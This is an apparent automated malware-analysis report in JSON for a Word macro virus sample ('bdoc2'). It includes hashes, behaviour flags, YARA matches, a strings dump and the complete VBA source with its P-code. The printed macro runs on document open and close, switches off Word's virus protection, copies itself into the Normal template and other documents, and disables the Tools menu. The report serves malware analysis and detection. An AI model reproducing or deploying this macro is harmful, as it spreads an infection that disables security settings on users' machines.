{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"bdoc2\""
        ],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "AutoExec": "Runs when the Word document is opened",
            "AutoExit": "Runs when the Word document is closed",
            "AutoOpen": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Kill": "May delete a file",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "\n\nSub AutoOpen()\nOn Error Resume Next\nOptions.VirusProtection = False\nOptions.SaveNormalPrompt = False\nOptions.ConfirmConversions = False\nFor I = 1 To NormalTemplate.VBProject.VBComponents.Count\n    If NormalTemplate.VBProject.VBComponents(I).Name = \"bdoc2\" Then NormInstall = True\nNext I\nFor I = 1 To ActiveDocument.VBProject.VBComponents.Count\n    If ActiveDocument.VBProject.VBComponents(I).Name = \"bdoc2\" Then ActivInstall = True\nNext I\nIf ActivInstall = True And NormInstall = True Then GoTo Label_Exit\nIf ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument\nIf ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate\nDoc.VBProject.VBComponents(\"bdoc2\").Export (\"c:\\bdoc2.txt\")\n\nIf ActiveInstall = True And NormInstall = False Then\nNormalTemplate.VBProject.VBComponents.Import (\"c:\\bdoc2.txt\")\nNormalTemplate.Save\nElse\nDname = ActiveDocument.FullName\nIf Left$(Dname, 8) = \"Document\" Then GoTo Label_Exit\nActiveDocument.VBProject.VBComponents.Import (\"c:\\bdoc2.txt\")\nActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument\nEnd If\n\nLabel_Exit:\nCommandBars(\"Tools\").Enabled = False\nApplication.ScreenUpdating = True\nApplication.DisplayAlerts = wdAlertsAll\nApplication.EnableCancelKey = wdCancelInterrupt\nEnd Sub\nSub AutoClose()\nOn Error Resume Next\nIf Day(Now) = 2 And Month(Now) = 9 Then MsgBox \"\u0423\u0410\u0424\u00b6\u00b5\u0414\u0427\u0408\u0451\u0408 , \u0419\u044a\u0418\u0425\u0457\u043c\u0410\u0426!!!\", vbCritical\nApplication.DisplayAlerts = wdAlertsNone\nFor I = 1 To NormalTemplate.VBProject.VBComponents.Count\nIf NormalTemplate.VBProject.VBComponents(I).Name = \"bdoc2\" Then NormInstall = True\nNext I\nFor I = 1 To ActiveDocument.VBProject.VBComponents.Count\nIf ActiveDocument.VBProject.VBComponents(I).Name = \"bdoc2\" Then ActiveInstall = True\nNext I\nIf ActiveInstall = True And NormInstall = True Then GoTo Label_Exit\nIf ActiveInstall = True And NormInstall = False Then\nNormalTemplate.VBProject.VBComponents.Import (\"c:\\bdoc2.txt\")\nNormalTemplate.Save\nElse\nDname = ActiveDocument.FullName\nIf Left$(Dname, 8) = \"Document\" Then GoTo Label_Exit\nActiveDocument.VBProject.VBComponents.Import (\"c:\\bdoc2.txt\")\nActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument\nEnd If\nLabel_Exit:\nEnd Sub\n\nPublic Sub AutoExec()\nOn Error Resume Next\nCommandBars(\"Tools\").Enabled = False\nApplication.DisplayAlerts = wdAlertsNone\nApplication.ScreenUpdating = False\nOptions.VirusProtection = False\nEnd Sub\nSub AutoExit()\nOn Error Resume Next\nKill (\"c:\\bdoc2.txt\")\nIf Day(Now) = 13 Then MsgBox \"\u0417\u043b\u041a\u2116\u0423\u0413\u00b5\u0411\u00b0\u0436\u0418\u043d\u0458\u044e,Press OK!!\", vbCritical\nEnd Sub\n\n\n' Processing file: VirusShare_010f0b17418756f8ff34e1e28ec10605\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 903 bytes\n' Macros/VBA/bdoc2 - 4134 bytes\n' Line #0:\n' \tFuncDefn (Sub AutoOpen())\n' Line #1:\n' \tOnError (Resume Next) \n' Line #2:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' Line #3:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' Line #4:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt ConfirmConversions \n' Line #5:\n' \tStartForVariable \n' \tLd I \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tFor \n' Line #6:\n' \tLd I \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd New \n' \tLitStr 0x0005 \"bdoc2\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitVarSpecial (True)\n' \tSt NormInstall \n' \tEndIf \n' Line #7:\n' \tStartForVariable \n' \tLd I \n' \tEndForVariable \n' \tNextVar \n' Line #8:\n' \tStartForVariable \n' \tLd I \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tFor \n' Line #9:\n' \tLd I \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd New \n' \tLitStr 0x0005 \"bdoc2\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitVarSpecial (True)\n' \tSt ActivInstall \n' \tEndIf \n' Line #10:\n' \tStartForVariable \n' \tLd I \n' \tEndForVariable \n' \tNextVar \n' Line #11:\n' \tLd ActivInstall \n' \tLitVarSpecial (True)\n' \tEq \n' \tLd NormInstall \n' \tLitVarSpecial (True)\n' \tEq \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tGoTo Label_Exit \n' \tEndIf \n' Line #12:\n' \tLd ActivInstall \n' \tLitVarSpecial (True)\n' \tEq \n' \tLd NormInstall \n' \tLitVarSpecial (False)\n' \tEq \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tSetStmt \n' \tLd ActiveDocument \n' \tSet Doc \n' \tEndIf \n' Line #13:\n' \tLd ActivInstall \n' \tLitVarSpecial (False)\n' \tEq \n' \tLd NormInstall \n' \tLitVarSpecial (True)\n' \tEq \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tSetStmt \n' \tLd NormalTemplate \n' \tSet Doc \n' \tEndIf \n' Line #14:\n' \tLitStr 0x000C \"c:\\bdoc2.txt\"\n' \tParen \n' \tLitStr 0x0005 \"bdoc2\"\n' \tLd Doc \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tArgsMemCall Export 0x0001 \n' Line #15:\n' Line #16:\n' \tLd ActiveInstall \n' \tLitVarSpecial (True)\n' \tEq \n' \tLd NormInstall \n' \tLitVarSpecial (False)\n' \tEq \n' \tAnd \n' \tIfBlock \n' Line #17:\n' \tLitStr 0x000C \"c:\\bdoc2.txt\"\n' \tParen \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemCall Import 0x0001 \n' Line #18:\n' \tLd NormalTemplate \n' \tArgsMemCall Save 0x0000 \n' Line #19:\n' \tElseBlock \n' Line #20:\n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tSt Dname \n' Line #21:\n' \tLd Dname \n' \tLitDI2 0x0008 \n' \tArgsLd LBound$ 0x0002 \n' \tLitStr 0x0008 \"Document\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo Label_Exit \n' \tEndIf \n' Line #22:\n' \tLitStr 0x000C \"c:\\bdoc2.txt\"\n' \tParen \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemCall Import 0x0001 \n' Line #23:\n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd wdFormatDocument \n' \tParamNamed FileFormat \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0002 \n' Line #24:\n' \tEndIfBlock \n' Line #25:\n' Line #26:\n' \tLabel Label_Exit \n' Line #27:\n' \tLitVarSpecial (False)\n' \tLitStr 0x0005 \"Tools\"\n' \tArgsLd CommandBars 0x0001 \n' \tMemSt Enabled \n' Line #28:\n' \tLitVarSpecial (True)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #29:\n' \tLd wdAlertsAll \n' \tLd Application \n' \tMemSt DisplayAlerts \n' Line #30:\n' \tLd wdCancelInterrupt \n' \tLd Application \n' \tMemSt EnableCancelKey \n' Line #31:\n' \tEndSub \n' Line #32:\n' \tFuncDefn (Sub AutoClose())\n' Line #33:\n' \tOnError (Resume Next) \n' Line #34:\n' \tLd Now \n' \tArgsLd Day 0x0001 \n' \tLitDI2 0x0002 \n' \tEq \n' \tLd Now \n' \tArgsLd Month 0x0001 \n' \tLitDI2 0x0009 \n' \tEq \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0018 \"\u0423\u0410\u0424\u00b6\u00b5\u0414\u0427\u0408\u0451\u0408 , \u0419\u044a\u0418\u0425\u0457\u043c\u0410\u0426!!!\"\n' \tLd vbCritical \n' \tArgsCall MsgBox 0x0002 \n' \tEndIf \n' Line #35:\n' \tLd wdAlertsNone \n' \tLd Application \n' \tMemSt DisplayAlerts \n' Line #36:\n' \tStartForVariable \n' \tLd I \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tFor \n' Line #37:\n' \tLd I \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd New \n' \tLitStr 0x0005 \"bdoc2\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitVarSpecial (True)\n' \tSt NormInstall \n' \tEndIf \n' Line #38:\n' \tStartForVariable \n' \tLd I \n' \tEndForVariable \n' \tNextVar \n' Line #39:\n' \tStartForVariable \n' \tLd I \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tFor \n' Line #40:\n' \tLd I \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd New \n' \tLitStr 0x0005 \"bdoc2\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitVarSpecial (True)\n' \tSt ActiveInstall \n' \tEndIf \n' Line #41:\n' \tStartForVariable \n' \tLd I \n' \tEndForVariable \n' \tNextVar \n' Line #42:\n' \tLd ActiveInstall \n' \tLitVarSpecial (True)\n' \tEq \n' \tLd NormInstall \n' \tLitVarSpecial (True)\n' \tEq \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tGoTo Label_Exit \n' \tEndIf \n' Line #43:\n' \tLd ActiveInstall \n' \tLitVarSpecial (True)\n' \tEq \n' \tLd NormInstall \n' \tLitVarSpecial (False)\n' \tEq \n' \tAnd \n' \tIfBlock \n' Line #44:\n' \tLitStr 0x000C \"c:\\bdoc2.txt\"\n' \tParen \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemCall Import 0x0001 \n' Line #45:\n' \tLd NormalTemplate \n' \tArgsMemCall Save 0x0000 \n' Line #46:\n' \tElseBlock \n' Line #47:\n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tSt Dname \n' Line #48:\n' \tLd Dname \n' \tLitDI2 0x0008 \n' \tArgsLd LBound$ 0x0002 \n' \tLitStr 0x0008 \"Document\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo Label_Exit \n' \tEndIf \n' Line #49:\n' \tLitStr 0x000C \"c:\\bdoc2.txt\"\n' \tParen \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemCall Import 0x0001 \n' Line #50:\n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd wdFormatDocument \n' \tParamNamed FileFormat \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0002 \n' Line #51:\n' \tEndIfBlock \n' Line #52:\n' \tLabel Label_Exit \n' Line #53:\n' \tEndSub \n' Line #54:\n' Line #55:\n' \tFuncDefn (Public Sub AutoExec())\n' Line #56:\n' \tOnError (Resume Next) \n' Line #57:\n' \tLitVarSpecial (False)\n' \tLitStr 0x0005 \"Tools\"\n' \tArgsLd CommandBars 0x0001 \n' \tMemSt Enabled \n' Line #58:\n' \tLd wdAlertsNone \n' \tLd Application \n' \tMemSt DisplayAlerts \n' Line #59:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #60:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' Line #61:\n' \tEndSub \n' Line #62:\n' \tFuncDefn (Sub AutoExit())\n' Line #63:\n' \tOnError (Resume Next) \n' Line #64:\n' \tLitStr 0x000C \"c:\\bdoc2.txt\"\n' \tParen \n' \tArgsCall Kill 0x0001 \n' Line #65:\n' \tLd Now \n' \tArgsLd Day 0x0001 \n' \tLitDI2 0x000D \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0019 \"\u0417\u043b\u041a\u2116\u0423\u0413\u00b5\u0411\u00b0\u0436\u0418\u043d\u0458\u044e,Press OK!!\"\n' \tLd vbCritical \n' \tArgsCall MsgBox 0x0002 \n' \tEndIf \n' Line #66:\n' \tEndSub \n' Line #67:\n"
    },
    "filename": "VirusShare_010f0b17418756f8ff34e1e28ec10605",
    "filesize": 30720,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1251, Author: Main, Template: Normal, Last Saved By: Main, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Fri May  4 12:31:00 2001, Last Saved Time/Date: Fri May  4 12:31:00 2001, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "010f0b17418756f8ff34e1e28ec10605",
        "sha1": "e9805d575d64e55c3a17b9f53c934f3190449077",
        "sha256": "f6a33806db5c618708d04351ce91105704e4fc51bb4fb5db28740101a4485110"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjWW",
            ". A!",
            "#U#U",
            "Main",
            "Normal",
            "Main",
            "Microsoft Word 8.0",
            "School N8",
            "_PID_GUID",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "33af29309",
            "43af29309",
            "WordS10",
            "VBA0",
            "Win16",
            "Win32",
            "Mac0",
            "stdole`0",
            "MSFormsC",
            "ThisDocument<0",
            "_Evaluate",
            "Normal0",
            "Office",
            "Project-0",
            "bdoc2",
            "AutoOpen*0",
            "Options0",
            "VirusProtectionoD0",
            "SaveNormalPrompt\u02bc0",
            "ConfirmConversions",
            "NormalTemplateq0",
            "VBProjectOh0",
            "VBComponents",
            "Count0v0",
            "NormInstallp0",
            "ActiveDocument\\0",
            "ActivInstall",
            "Label_Exit0",
            "Doc0",
            "Export0",
            "ActiveInstall_0",
            "Importi0",
            "Save0",
            "Dnamew0",
            "FullName\u041e0",
            "SaveAsf;0",
            "FileNamej0",
            "FileFormat0",
            "wdFormatDocument0",
            "CommandBars",
            "Enabled\u06ea0",
            "Application*0",
            "ScreenUpdating!",
            "DisplayAlerts0",
            "wdAlertsAll",
            "EnableCancelKey0",
            "wdCancelInterruptI0",
            "AutoClose0",
            "Day0",
            "Now&0",
            "Month",
            "MsgBoxR0",
            "vbCritical+}0",
            "wdAlertsNone0",
            "AutoExec0",
            "AutoExit0",
            "Kill0",
            "Documentj0",
            "Project",
            "rstd",
            "ole>",
            "\\G{00",
            "bdoc2",
            "bdoc2",
            "c:\\bdoc2.txt",
            "bdoc2",
            "c:\\bdoc2.txt",
            "Document",
            "c:\\bdoc2.txt",
            "Tools",
            "\u0536\u05e3 , \u057f!!! ",
            "bdoc2",
            "bdoc2",
            "c:\\bdoc2.txt",
            "Document",
            "c:\\bdoc2.txt",
            "Tools",
            "c:\\bdoc2.txt",
            ",Press OK!!",
            "Attribut",
            "e VB_Nam",
            "e = \"bdo",
            " AutoOpe",
            "Error Resu",
            "Next",
            "ptions.V",
            "irusProt",
            "Fals",
            "@SaveNo",
            "rmal",
            "Jmpt",
            "BConfirma",
            "vers",
            "1 To ",
            "FTemplate.VB",
            "Components.Coun",
            "If#3(I).",
            " Then",
            "InstallA",
            "Truk",
            "~veDoc",
            " Andh\tC:GoWLabel_ExiO",
            "Set @J",
            "X(D).",
            "Export (",
            "\"c:\\B.txt\"",
            "#eOG6",
            "EBDnC",
            "M`.Full",
            ",L eft$(B",
            ", 8)X\"@AB\"Tp",
            "As File",
            "cmat:x=wd#",
            "PI f",
            "wmandBa",
            "rs(\"Tool",
            "s\"`8nable",
            "lica",
            ".ScreenUpd",
            " yAlerts ",
            "Allk\t",
            "Cancel",
            "KeyB",
            "Interrup bE ",
            "Close7",
            "`^Day(Now",
            "52KMonth",
            "7MsgBo",
            "x \"\u0536",
            "\u05e3 , ",
            "!!!\", vbpCrit ",
            "N@,Wh@",
            "NsZz~z\u1e66",
            "_c_?__lEao",
            "EtEE",
            ":EEV;",
            "ubC Exec;e ",
            "IKD8F8yIKMO?g;",
            "p@*I13kH",
            ",Press OK~H",
            "020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WIN98\\S@YSTEM\\",
            ".tlb#OLE",
            " AutomatHion",
            "SForms>",
            "E4D77",
            "6561-3BF",
            "E-11D5-A",
            "E1C0304498",
            "WD#Microsoft ",
            " Libprary",
            "O4*OIP\\VBE\\",
            "EX'(.E",
            "vN@Ta*lvNSa@w",
            "j @+\tB,C",
            "0:\teOffic\u0107O",
            "G{2DF8D0",
            "4C-5BFA-",
            "101B-BDER5",
            "eAA4",
            "ePROGRAM",
            " FILES\\M",
            "ICROSOFT",
            " OFFICE\\",
            "MSO97.D",
            "LLj# 8.0E",
            "ThisD",
            "ocument",
            "bdoc2",
            "BbBc",
            "ThisDocument",
            "bdoc2",
            "ID=\"{810BA007-40A2-11D5-A91D-00001C034498}\"",
            "Document=ThisDocument/&H00000000",
            "Module=bdoc2",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"9B99EB928296829682968296\"",
            "DPB=\"3634463F7A411442144214\"",
            "GC=\"D1D3A142A242A2BD\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "bdoc2=0, 0, 0, 0, C",
            " Microsoft Word",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "c:\\bdoc2.txt": "Text"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.324320",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
